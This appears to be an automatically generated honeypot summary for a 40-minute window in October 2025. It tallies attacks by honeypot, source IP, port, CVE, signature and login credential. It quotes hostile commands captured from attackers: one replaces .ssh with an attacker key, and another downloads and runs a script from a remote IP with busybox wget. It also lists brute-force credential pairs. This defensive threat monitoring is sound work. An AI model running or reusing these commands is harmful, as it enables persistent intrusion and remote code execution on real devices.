**Honeypot Attack Summary Report**

**Report Generation Time:** 2025-10-19T23:01:38Z
**Timeframe:** 2025-10-19T22:20:01Z to 2025-10-19T23:00:01Z
**Files Used:**
- agg_log_20251019T222001Z.json
- agg_log_20251019T224001Z.json
- agg_log_20251019T230001Z.json

**Executive Summary**

This report summarizes 7,046 attacks recorded across multiple honeypots. The majority of attacks were captured by the Cowrie honeypot, indicating a high volume of SSH and Telnet-based threats. A significant number of attacks originated from a small group of IP addresses, with `72.146.232.13` being the most prominent. Port 22 (SSH) was the most targeted port. Attackers were observed attempting to gain access using common default credentials and executing commands to add their SSH keys for persistent access. Several vulnerabilities were targeted, with CVE-2002-1149 being the most frequently observed.

**Detailed Analysis**

***Attacks by honeypot:***
- Cowrie: 4492
- Honeytrap: 1173
- Suricata: 593
- Ciscoasa: 555
- Tanner: 94
- Sentrypeer: 51
- H0neytr4p: 27
- Dionaea: 23
- Adbhoney: 18
- Mailoney: 17
- Redishoneypot: 3

***Top attacking IPs:***
- 72.146.232.13: 603
- 206.189.97.124: 530
- 103.250.10.128: 198
- 200.8.228.57: 197
- 43.156.119.102: 177
- 172.174.5.146: 146
- 128.199.183.138: 153
- 210.79.191.147: 156
- 5.198.176.28: 157
- 35.194.3.211: 168

***Top targeted ports/protocols:***
- 22: 856
- 8333: 110
- 80: 86
- 5904: 76
- 5905: 76
- 5060: 47
- 443: 23
- 5901: 42
- 5902: 38
- 5903: 38

***Most common CVEs:***
- CVE-2002-1149
- CVE-2002-0013 CVE-2002-0012
- CVE-2019-11500 CVE-2019-11500
- CVE-2021-3449 CVE-2021-3449
- CVE-2002-0013 CVE-2002-0012 CVE-1999-0517
- CVE-2024-3721 CVE-2024-3721
- CVE-2005-4050

***Commands attempted by attackers:***
- `cd ~; chattr -ia .ssh; lockr -ia .ssh`: 33
- `lockr -ia .ssh`: 33
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."`: 33
- `cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'`: 8
- `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`: 8
- `ls -lh $(which ls)`: 8
- `which ls`: 8
- `crontab -l`: 8
- `w`: 8
- `uname -m`: 8

***Signatures triggered:***
- ET DROP Dshield Block Listed Source group 1: 156
- 2402000: 156
- ET SCAN NMAP -sS window 1024: 82
- 2009582: 82
- ET INFO Reserved Internal IP Traffic: 40
- 2002752: 40
- ET SCAN MS Terminal Server Traffic on Non-standard Port: 27
- 2023753: 27
- ET SCAN Potential SSH Scan: 15
- 2001219: 15

***Users / login attempts:***
- 345gs5662d34/345gs5662d34: 32
- user01/Password01: 11
- deploy/123123: 11
- deploy/3245gs5662d34: 8
- ajay/123: 6
- mariadb/mariadb: 5
- root/qwertyuiop123.: 4
- root/Abc123456789: 4
- jhlee/jhlee: 4
- diogo/123: 4

***Files uploaded/downloaded:***
- wget.sh;: 8
- welcome.jpg): 3
- writing.jpg): 3
- tags.jpg): 3
- w.sh;: 2
- c.sh;: 2

***HTTP User-Agents:***
- No HTTP User-Agents were recorded in the logs.

***SSH clients and servers:***
- No SSH clients were recorded in the logs.
- No SSH servers were recorded in the logs.

***Top attacker AS organizations:***
- No attacker AS organizations were recorded in the logs.

**Key Observations and Anomalies**

- A recurring pattern of commands was observed where attackers attempt to modify the `.ssh` directory and add their own SSH key to the `authorized_keys` file. This is a common technique for establishing persistent access to a compromised system.
- The command `rm -rf /data/local/tmp; mkdir -p /data/local/tmp; cd /data/local/tmp/; busybox wget http://213.209.143.62/w.sh; sh w.sh; ...` suggests an attempt to download and execute malicious scripts from a remote server. The use of `busybox`, `wget`, and `curl` indicates that the attackers are targeting embedded systems or IoT devices.
- The high number of login attempts with the credentials `345gs5662d34/345gs5662d34` suggests a targeted brute-force attack or the use of compromised credentials.
- The presence of reconnaissance commands like `uname -a`, `whoami`, `lscpu`, and `cat /proc/cpuinfo` indicates that attackers are actively profiling the honeypot systems to tailor their attacks.
